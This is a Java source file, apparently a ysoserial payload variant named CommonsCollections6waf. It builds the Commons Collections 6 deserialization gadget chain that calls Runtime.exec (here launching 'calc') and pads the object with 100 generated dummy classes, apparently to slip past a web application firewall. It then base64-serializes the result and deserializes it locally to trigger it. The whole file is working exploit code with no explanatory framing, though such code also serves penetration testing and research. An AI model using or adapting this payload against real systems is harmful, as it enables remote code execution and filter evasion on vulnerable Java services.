package ysoserial.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Map;
import java.util.Base64;

public class CommonsCollections6waf {
    public static Class makeClass(String clazzName) throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));



        TiedMapEntry tiedMapEntry =  new TiedMapEntry(lazyMap, "aaa");
        HashMap<Object, Object> hashMap = new HashMap<>();



        hashMap.put(tiedMapEntry, "bbb");
        lazyMap.remove("aaa");

        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, chainedTransformer);

        LinkedList linkedList = new LinkedList();
        StringBuilder sb = new StringBuilder();
        for (int i=0;i<100;i++){
            sb.append("e");
            linkedList.add(makeClass("woshijiad"+sb));
        }
        linkedList.add(hashMap);
        String str = Serialize(linkedList);
        System.out.println(str);
        UnSerialize(str);
    }
    private static String Serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        return new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));
    }
    private static void UnSerialize(String str) throws Exception{
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(str)));
        objectInputStream.readObject();
        objectInputStream.close();
    }

}
